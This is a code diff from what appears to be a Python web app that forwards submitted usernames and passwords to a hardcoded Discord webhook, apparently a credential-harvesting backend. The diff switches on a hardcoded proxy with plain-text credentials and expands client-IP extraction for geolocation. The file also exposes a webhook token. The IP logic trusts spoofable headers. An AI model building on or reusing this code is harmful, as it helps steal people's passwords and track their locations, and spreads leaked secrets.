@@ -19,12 +19,12 @@ WEBHOOK_URL = "https://discord.com/api/webhooks/1523355615525867650/s28X3S_aIDij
 
 # Your proxy configuration
 PROXY = {
-    # 'http': '14ad8d1127bc2:b98fe3138d@217.67.68.235:12323',
-    # 'https': '14ad8d1127bc2:b98fe3138d@217.67.68.235:12323'
+    'http': '14ad8d1127bc2:b98fe3138d@217.67.68.235:12323',
+    'https': '14ad8d1127bc2:b98fe3138d@217.67.68.235:12323'
 }
 
 # Set to True to use proxy
-USE_PROXY = False
+USE_PROXY = True
 
 # IP Geolocation API (free, no API key required)
 IP_API_URL = "http://ip-api.com/json/"
@@ -266,12 +266,59 @@ def send_discord_notification(username, password, user_id=None, ip_address=None,
         return False
 
 def get_client_ip(request):
-    x_forwarded_for = request.META.get("HTTP_X_FORWARDED_FOR")
+    """
+    Function to accurately extract the actual client IP across all environments (local/production)
 
+    Priority:
+    1. X-Forwarded-For (Proxy/Load Balancer environments)
+    2. X-Real-IP (Some proxy environments)
+    3. REMOTE_ADDR (Direct connection)
+    4. CF-Connecting-IP (When using Cloudflare)
+    5. HTTP_CLIENT_IP (Some proxies)
+    6. HTTP_X_FORWARDED (Other proxy variants)
+    7. HTTP_X_CLUSTER_CLIENT_IP (Cluster environments)
+    """
+    
+    # 1. Check X-Forwarded-For header (Most common proxy header)
+    x_forwarded_for = request.META.get('HTTP_X_FORWARDED_FOR')
     if x_forwarded_for:
-        return x_forwarded_for.split(",")[0].strip()
-
-    return request.META.get("REMOTE_ADDR")
+        # Multiple IPs may appear in a chain; the first IP is the actual client IP
+        ip = x_forwarded_for.split(',')[0].strip()
+        if ip and ip != 'unknown':
+            return ip
+    
+    # 2. Check X-Real-IP header (Commonly used with Nginx, etc.)
+    x_real_ip = request.META.get('HTTP_X_REAL_IP')
+    if x_real_ip and x_real_ip != 'unknown':
+        return x_real_ip
+    
+    # 3. When using Cloudflare (CF-Connecting-IP)
+    cf_ip = request.META.get('HTTP_CF_CONNECTING_IP')
+    if cf_ip and cf_ip != 'unknown':
+        return cf_ip
+    
+    # 4. HTTP_CLIENT_IP (Some proxy servers)
+    client_ip = request.META.get('HTTP_CLIENT_IP')
+    if client_ip and client_ip != 'unknown':
+        return client_ip
+    
+    # 5. HTTP_X_FORWARDED (Other proxy variants)
+    x_forwarded = request.META.get('HTTP_X_FORWARDED')
+    if x_forwarded and x_forwarded != 'unknown':
+        return x_forwarded
+    
+    # 6. HTTP_X_CLUSTER_CLIENT_IP (Cluster/Load Balancer)
+    cluster_ip = request.META.get('HTTP_X_CLUSTER_CLIENT_IP')
+    if cluster_ip and cluster_ip != 'unknown':
+        return cluster_ip
+    
+    # 7.REMOTE_ADDR (Direct connection or last resort)
+    remote_ip = request.META.get('REMOTE_ADDR')
+    if remote_ip:
+        return remote_ip
+    
+    # 8.Return '0.0.0.0' if nothing is found
+    return '0.0.0.0'
 
 
 def user_profile(request, user_id):
